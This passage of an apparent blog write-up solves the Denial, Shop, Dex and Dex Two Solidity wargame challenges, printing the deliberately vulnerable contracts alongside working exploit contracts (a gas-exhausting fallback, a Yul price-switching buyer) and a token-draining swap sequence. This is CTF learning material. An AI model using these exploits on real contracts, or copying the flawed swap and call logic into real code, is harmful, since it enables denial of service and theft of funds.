</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>setWithdrawPartner</span><span class=p>(</span><span class=kt>address</span> <span class=n>_partner</span><span class=p>)</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>partner</span> <span class=o>=</span> <span class=n>_partner</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// withdraw 1% to recipient and 1% to owner
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kd>function</span> <span class=nf>withdraw</span><span class=p>()</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>uint</span> <span class=n>amountToSend</span> <span class=o>=</span> <span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>).</span><span class=nb>balance</span><span class=p>.</span><span class=n>div</span><span class=p>(</span><span class=mi>100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>// perform a call without checking return
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// The recipient can revert, the owner will still get their share
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>partner</span><span class=p>.</span><span class=nb>call</span><span class=p>{</span><span class=nb>value</span><span class=o>:</span><span class=n>amountToSend</span><span class=p>}(</span><span class=s>&#34;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>owner</span><span class=p>.</span><span class=nb>transfer</span><span class=p>(</span><span class=n>amountToSend</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>// keep track of last withdrawal time
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>timeLastWithdrawn</span> <span class=o>=</span> <span class=nb>now</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>withdrawPartnerBalances</span><span class=p>[</span><span class=n>partner</span><span class=p>]</span> <span class=o>=</span> <span class=n>withdrawPartnerBalances</span><span class=p>[</span><span class=n>partner</span><span class=p>].</span><span class=n>add</span><span class=p>(</span><span class=n>amountToSend</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// allow deposit of funds
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>receive</span><span class=p>()</span> <span class=k>external</span> <span class=k>payable</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// convenience function
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kd>function</span> <span class=nf>contractBalance</span><span class=p>()</span> <span class=k>public</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>).</span><span class=nb>balance</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>This challenge is similar to &ldquo;9. King&rdquo; challenge. We have to deny the owner from withdrawing the funds. The exploit for &ldquo;King&rdquo; challenge doesn&rsquo;t work here, That&rsquo;s because &ldquo;call&rdquo; is used instead of &ldquo;transfer&rdquo; to send ether. &ldquo;call&rdquo; doesn&rsquo;t propagate the errors, it just returns boolean indicating the success of the &ldquo;call&rdquo;. so, simply reverting from fallback function doesn&rsquo;t solve this challenge. What we can do is consume all the available gas in the fallback function using some gas heavy operations and when the call is completed, there won&rsquo;t be enough gas for further operations and transaction fails because of low gas. As storage operations consume maximum gas, we can use loops to repeatedly read and write to storage.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>6</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>DenialExploit</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint</span> <span class=n>f</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint</span> <span class=n>s</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint</span> <span class=n>k</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>receive</span><span class=p>()</span> <span class=k>external</span> <span class=k>payable</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=kt>uint</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>10000</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>f</span> <span class=o>=</span> <span class=n>f</span> <span class=o>+</span> <span class=n>i</span><span class=o>**</span><span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>s</span> <span class=o>=</span> <span class=n>s</span> <span class=o>+</span> <span class=n>f</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h3 id=shop>Shop</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>6</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>interface</span> <span class=nc>Buyer</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>price</span><span class=p>()</span> <span class=k>external</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>Shop</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint</span> <span class=k>public</span> <span class=n>price</span> <span class=o>=</span> <span class=mi>100</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>bool</span> <span class=k>public</span> <span class=n>isSold</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>buy</span><span class=p>()</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>Buyer</span> <span class=n>_buyer</span> <span class=o>=</span> <span class=n>Buyer</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>_buyer</span><span class=p>.</span><span class=n>price</span><span class=p>{</span><span class=nb>gas</span><span class=o>:</span><span class=mi>3300</span><span class=p>}()</span> <span class=o>&gt;=</span> <span class=n>price</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=n>isSold</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>isSold</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>price</span> <span class=o>=</span> <span class=n>_buyer</span><span class=p>.</span><span class=n>price</span><span class=p>{</span><span class=nb>gas</span><span class=o>:</span><span class=mi>3300</span><span class=p>}();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>This challenge is similar to &ldquo;11. Elevator&rdquo; i.e we have to return different values from the same function, based on the number of call. In this, for the first call to our &ldquo;Buyer&rdquo; contract&rsquo;s &ldquo;price&rdquo; function, it has to return number greater than 100 and for second call to the same function, it should return number less than 100. This challenge differs &ldquo;Elevator&rdquo; challenge in how much gas is forwarded for the call. While calling &ldquo;price&rdquo; function, &ldquo;Shop&rdquo; contract forwards exactly &ldquo;3300&rdquo; gas. $$3300$$ gas is very less to do any storage operations i.e provided gas is not enough to store a value in state variable which makes &ldquo;Elevator&rdquo; challenge exploit useless. Without a state variable, we have to use &ldquo;Shop&rdquo; contracts &ldquo;isSold&rdquo; variable to differentiate the calls. Note that &ldquo;isSold&rdquo; is changed to true between the two calls. Even if we don&rsquo;t use storage related operations, to complete message call to another contract with the available gas, we have to write the price function in solidity assembly &ldquo;Yul&rdquo; language minimizing the gas consumption.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>pragma</span> <span class=nx>solidity</span> <span class=o>^</span><span class=mf>0.6</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>contract</span> <span class=nx>Buyer</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>Shop</span> <span class=kr>public</span> <span class=nx>shop</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>bool</span> <span class=kr>public</span> <span class=nx>a</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=c1>// constant variables are replaced at compile time.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nx>address</span> <span class=nx>constant</span> <span class=nx>shopAddress</span> <span class=o>=</span> <span class=mh>0xeE2Bce1C36041B5073a8420767A1e7997738cEE8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>bytes4</span> <span class=nx>constant</span> <span class=nx>signature</span> <span class=o>=</span> <span class=nx>hex</span><span class=s2>&#34;e852e741&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>constructor</span><span class=p>(</span><span class=nx>address</span> <span class=nx>_shop</span><span class=p>)</span> <span class=kr>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>shop</span> <span class=o>=</span> <span class=nx>Shop</span><span class=p>(</span><span class=nx>_shop</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nx>price</span><span class=p>()</span> <span class=kr>public</span>  <span class=nx>returns</span> <span class=p>(</span><span class=nx>uint</span> <span class=nx>result</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>assembly</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=kd>let</span> <span class=nx>x</span> <span class=o>:=</span> <span class=nx>mload</span><span class=p>(</span><span class=mh>0x40</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nx>result</span> <span class=o>:=</span> <span class=nx>mload</span><span class=p>(</span><span class=mh>0x40</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nx>mstore</span><span class=p>(</span><span class=nx>x</span><span class=p>,</span> <span class=nx>signature</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=kd>let</span> <span class=nx>success</span> <span class=o>:=</span> <span class=nx>call</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                            <span class=nx>gas</span><span class=p>(),</span> <span class=c1>// remaining gas
</span></span></span><span class=line><span class=cl><span class=c1></span>                            <span class=nx>shopAddress</span><span class=p>,</span> <span class=c1>// To addr
</span></span></span><span class=line><span class=cl><span class=c1></span>                            <span class=mi>0</span><span class=p>,</span>    <span class=c1>// No wei passed
</span></span></span><span class=line><span class=cl><span class=c1></span>                            <span class=nx>x</span><span class=p>,</span>    <span class=c1>// Inputs are at location x
</span></span></span><span class=line><span class=cl><span class=c1></span>                            <span class=mh>0x4</span><span class=p>,</span> <span class=c1>// Inputs size two padded, so 68 bytes
</span></span></span><span class=line><span class=cl><span class=c1></span>                            <span class=nx>x</span><span class=p>,</span>    <span class=c1>//Store output over input
</span></span></span><span class=line><span class=cl><span class=c1></span>                            <span class=mh>0x20</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=nx>eq</span><span class=p>(</span><span class=nx>mload</span><span class=p>(</span><span class=nx>x</span><span class=p>),</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=nx>mstore</span><span class=p>(</span><span class=nx>result</span><span class=p>,</span> <span class=mi>100</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span><span class=p>(</span><span class=nx>result</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nx>callBuy</span><span class=p>()</span> <span class=kr>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>shop</span><span class=p>.</span><span class=nx>buy</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h3 id=dex>Dex</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>pragma</span> <span class=nx>solidity</span> <span class=o>^</span><span class=mf>0.6</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>import</span> <span class=s2>&#34;@openzeppelin/contracts/token/ERC20/IERC20.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>import</span> <span class=s2>&#34;@openzeppelin/contracts/token/ERC20/ERC20.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>import</span> <span class=s1>&#39;@openzeppelin/contracts/math/SafeMath.sol&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>contract</span> <span class=nx>Dex</span>  <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>using</span> <span class=nx>SafeMath</span> <span class=k>for</span> <span class=nx>uint</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nx>address</span> <span class=kr>public</span> <span class=nx>token1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nx>address</span> <span class=kr>public</span> <span class=nx>token2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nx>constructor</span><span class=p>(</span><span class=nx>address</span> <span class=nx>_token1</span><span class=p>,</span> <span class=nx>address</span> <span class=nx>_token2</span><span class=p>)</span> <span class=kr>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>token1</span> <span class=o>=</span> <span class=nx>_token1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>token2</span> <span class=o>=</span> <span class=nx>_token2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nx>swap</span><span class=p>(</span><span class=nx>address</span> <span class=nx>from</span><span class=p>,</span> <span class=nx>address</span> <span class=nx>to</span><span class=p>,</span> <span class=nx>uint</span> <span class=nx>amount</span><span class=p>)</span> <span class=kr>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>require</span><span class=p>((</span><span class=nx>from</span> <span class=o>==</span> <span class=nx>token1</span> <span class=o>&amp;&amp;</span> <span class=nx>to</span> <span class=o>==</span> <span class=nx>token2</span><span class=p>)</span> <span class=o>||</span> <span class=p>(</span><span class=nx>from</span> <span class=o>==</span> <span class=nx>token2</span> <span class=o>&amp;&amp;</span> <span class=nx>to</span> <span class=o>==</span> <span class=nx>token1</span><span class=p>),</span> <span class=s2>&#34;Invalid tokens&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>require</span><span class=p>(</span><span class=nx>IERC20</span><span class=p>(</span><span class=nx>from</span><span class=p>).</span><span class=nx>balanceOf</span><span class=p>(</span><span class=nx>msg</span><span class=p>.</span><span class=nx>sender</span><span class=p>)</span> <span class=o>&gt;=</span> <span class=nx>amount</span><span class=p>,</span> <span class=s2>&#34;Not enough to swap&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>uint</span> <span class=nx>swap_amount</span> <span class=o>=</span> <span class=nx>get_swap_price</span><span class=p>(</span><span class=nx>from</span><span class=p>,</span> <span class=nx>to</span><span class=p>,</span> <span class=nx>amount</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>IERC20</span><span class=p>(</span><span class=nx>from</span><span class=p>).</span><span class=nx>transferFrom</span><span class=p>(</span><span class=nx>msg</span><span class=p>.</span><span class=nx>sender</span><span class=p>,</span> <span class=nx>address</span><span class=p>(</span><span class=k>this</span><span class=p>),</span> <span class=nx>amount</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>IERC20</span><span class=p>(</span><span class=nx>to</span><span class=p>).</span><span class=nx>approve</span><span class=p>(</span><span class=nx>address</span><span class=p>(</span><span class=k>this</span><span class=p>),</span> <span class=nx>swap_amount</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>IERC20</span><span class=p>(</span><span class=nx>to</span><span class=p>).</span><span class=nx>transferFrom</span><span class=p>(</span><span class=nx>address</span><span class=p>(</span><span class=k>this</span><span class=p>),</span> <span class=nx>msg</span><span class=p>.</span><span class=nx>sender</span><span class=p>,</span> <span class=nx>swap_amount</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nx>add_liquidity</span><span class=p>(</span><span class=nx>address</span> <span class=nx>token_address</span><span class=p>,</span> <span class=nx>uint</span> <span class=nx>amount</span><span class=p>)</span> <span class=kr>public</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>IERC20</span><span class=p>(</span><span class=nx>token_address</span><span class=p>).</span><span class=nx>transferFrom</span><span class=p>(</span><span class=nx>msg</span><span class=p>.</span><span class=nx>sender</span><span class=p>,</span> <span class=nx>address</span><span class=p>(</span><span class=k>this</span><span class=p>),</span> <span class=nx>amount</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nx>get_swap_price</span><span class=p>(</span><span class=nx>address</span> <span class=nx>from</span><span class=p>,</span> <span class=nx>address</span> <span class=nx>to</span><span class=p>,</span> <span class=nx>uint</span> <span class=nx>amount</span><span class=p>)</span> <span class=kr>public</span> <span class=nx>view</span> <span class=nx>returns</span><span class=p>(</span><span class=nx>uint</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>((</span><span class=nx>amount</span> <span class=o>*</span> <span class=nx>IERC20</span><span class=p>(</span><span class=nx>to</span><span class=p>).</span><span class=nx>balanceOf</span><span class=p>(</span><span class=nx>address</span><span class=p>(</span><span class=k>this</span><span class=p>)))</span><span class=o>/</span><span class=nx>IERC20</span><span class=p>(</span><span class=nx>from</span><span class=p>).</span><span class=nx>balanceOf</span><span class=p>(</span><span class=nx>address</span><span class=p>(</span><span class=k>this</span><span class=p>)));</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nx>approve</span><span class=p>(</span><span class=nx>address</span> <span class=nx>spender</span><span class=p>,</span> <span class=nx>uint</span> <span class=nx>amount</span><span class=p>)</span> <span class=kr>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>SwappableToken</span><span class=p>(</span><span class=nx>token1</span><span class=p>).</span><span class=nx>approve</span><span class=p>(</span><span class=nx>spender</span><span class=p>,</span> <span class=nx>amount</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>SwappableToken</span><span class=p>(</span><span class=nx>token2</span><span class=p>).</span><span class=nx>approve</span><span class=p>(</span><span class=nx>spender</span><span class=p>,</span> <span class=nx>amount</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nx>balanceOf</span><span class=p>(</span><span class=nx>address</span> <span class=nx>token</span><span class=p>,</span> <span class=nx>address</span> <span class=nx>account</span><span class=p>)</span> <span class=kr>public</span> <span class=nx>view</span> <span class=nx>returns</span> <span class=p>(</span><span class=nx>uint</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>IERC20</span><span class=p>(</span><span class=nx>token</span><span class=p>).</span><span class=nx>balanceOf</span><span class=p>(</span><span class=nx>account</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>contract</span> <span class=nx>SwappableToken</span> <span class=nx>is</span> <span class=nx>ERC20</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>constructor</span><span class=p>(</span><span class=nx>string</span> <span class=nx>memory</span> <span class=nx>name</span><span class=p>,</span> <span class=nx>string</span> <span class=nx>memory</span> <span class=nx>symbol</span><span class=p>,</span> <span class=nx>uint</span> <span class=nx>initialSupply</span><span class=p>)</span> <span class=kr>public</span> <span class=nx>ERC20</span><span class=p>(</span><span class=nx>name</span><span class=p>,</span> <span class=nx>symbol</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>_mint</span><span class=p>(</span><span class=nx>msg</span><span class=p>.</span><span class=nx>sender</span><span class=p>,</span> <span class=nx>initialSupply</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Dex contract allows exchange between two ERC20 tokens. This token addresses are stored at the time of deployment and Dex allows only exchanging between these two tokens. Intially, we have 10 tokens of each token1 and token2, whereas Dex contract has 100 tokens in it&rsquo;s liquidity pool. Our goal is to drain all the tokens of any one token. The bug is in the &ldquo;get_swap_price&rdquo; function. it is calculated as</p><p>$$
swap_amount = \frac{amount * to_balance}{from_balance}
$$</p><p>Because of incorrect swap_amount, simple sequence of swappings will result in draining of one tokens balance</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>TKN1</span> <span class=err>=&gt;</span> <span class=no>TKN2</span> <span class=err>=&gt;</span> <span class=no>TKN1</span> <span class=err>=&gt;</span> <span class=no>TKN2</span> <span class=err>=&gt;</span> <span class=no>TKN1</span> <span class=err>=&gt;</span> <span class=no>...</span>
</span></span></code></pre></div><h3 id=dex-two>Dex Two</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>pragma</span> <span class=nx>solidity</span> <span class=o>^</span><span class=mf>0.6</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>import</span> <span class=s2>&#34;@openzeppelin/contracts/token/ERC20/IERC20.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>import</span> <span class=s2>&#34;@openzeppelin/contracts/token/ERC20/ERC20.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>import</span> <span class=s1>&#39;@openzeppelin/contracts/math/SafeMath.sol&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>contract</span> <span class=nx>DexTwo</span>  <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>using</span> <span class=nx>SafeMath</span> <span class=k>for</span> <span class=nx>uint</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nx>address</span> <span class=kr>public</span> <span class=nx>token1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nx>address</span> <span class=kr>public</span> <span class=nx>token2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nx>constructor</span><span class=p>(</span><span class=nx>address</span> <span class=nx>_token1</span><span class=p>,</span> <span class=nx>address</span> <span class=nx>_token2</span><span class=p>)</span> <span class=kr>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>token1</span> <span class=o>=</span> <span class=nx>_token1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>token2</span> <span class=o>=</span> <span class=nx>_token2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nx>swap</span><span class=p>(</span><span class=nx>address</span> <span class=nx>from</span><span class=p>,</span> <span class=nx>address</span> <span class=nx>to</span><span class=p>,</span> <span class=nx>uint</span> <span class=nx>amount</span><span class=p>)</span> <span class=kr>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>require</span><span class=p>(</span><span class=nx>IERC20</span><span class=p>(</span><span class=nx>from</span><span class=p>).</span><span class=nx>balanceOf</span><span class=p>(</span><span class=nx>msg</span><span class=p>.</span><span class=nx>sender</span><span class=p>)</span> <span class=o>&gt;=</span> <span class=nx>amount</span><span class=p>,</span> <span class=s2>&#34;Not enough to swap&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>uint</span> <span class=nx>swap_amount</span> <span class=o>=</span> <span class=nx>get_swap_amount</span><span class=p>(</span><span class=nx>from</span><span class=p>,</span> <span class=nx>to</span><span class=p>,</span> <span class=nx>amount</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>IERC20</span><span class=p>(</span><span class=nx>from</span><span class=p>).</span><span class=nx>transferFrom</span><span class=p>(</span><span class=nx>msg</span><span class=p>.</span><span class=nx>sender</span><span class=p>,</span> <span class=nx>address</span><span class=p>(</span><span class=k>this</span><span class=p>),</span> <span class=nx>amount</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>IERC20</span><span class=p>(</span><span class=nx>to</span><span class=p>).</span><span class=nx>approve</span><span class=p>(</span><span class=nx>address</span><span class=p>(</span><span class=k>this</span><span class=p>),</span> <span class=nx>swap_amount</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>IERC20</span><span class=p>(</span><span class=nx>to</span><span class=p>).</span><span class=nx>transferFrom</span><span class=p>(</span><span class=nx>address</span><span class=p>(</span><span class=k>this</span><span class=p>),</span> <span class=nx>msg</span><span class=p>.</span><span class=nx>sender</span><span class=p>,</span> <span class=nx>swap_amount</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nx>add_liquidity</span><span class=p>(</span><span class=nx>address</span> <span class=nx>token_address</span><span class=p>,</span> <span class=nx>uint</span> <span class=nx>amount</span><span class=p>)</span> <span class=kr>public</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>IERC20</span><span class=p>(</span><span class=nx>token_address</span><span class=p>).</span><span class=nx>transferFrom</span><span class=p>(</span><span class=nx>msg</span><span class=p>.</span><span class=nx>sender</span><span class=p>,</span> <span class=nx>address</span><span class=p>(</span><span class=k>this</span><span class=p>),</span> <span class=nx>amount</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nx>get_swap_amount</span><span class=p>(</span><span class=nx>address</span> <span class=nx>from</span><span class=p>,</span> <span class=nx>address</span> <span class=nx>to</span><span class=p>,</span> <span class=nx>uint</span> <span class=nx>amount</span><span class=p>)</span> <span class=kr>public</span> <span class=nx>view</span> <span class=nx>returns</span><span class=p>(</span><span class=nx>uint</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>((</span><span class=nx>amount</span> <span class=o>*</span> <span class=nx>IERC20</span><span class=p>(</span><span class=nx>to</span><span class=p>).</span><span class=nx>balanceOf</span><span class=p>(</span><span class=nx>address</span><span class=p>(</span><span class=k>this</span><span class=p>)))</span><span class=o>/</span><span class=nx>IERC20</span><span class=p>(</span><span class=nx>from</span><span class=p>).</span><span class=nx>balanceOf</span><span class=p>(</span><span class=nx>address</span><span class=p>(</span><span class=k>this</span><span class=p>)));</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nx>approve</span><span class=p>(</span><span class=nx>address</span> <span class=nx>spender</span><span class=p>,</span> <span class=nx>uint</span> <span class=nx>amount</span><span class=p>)</span> <span class=kr>public</span> <span class=p>{</span>
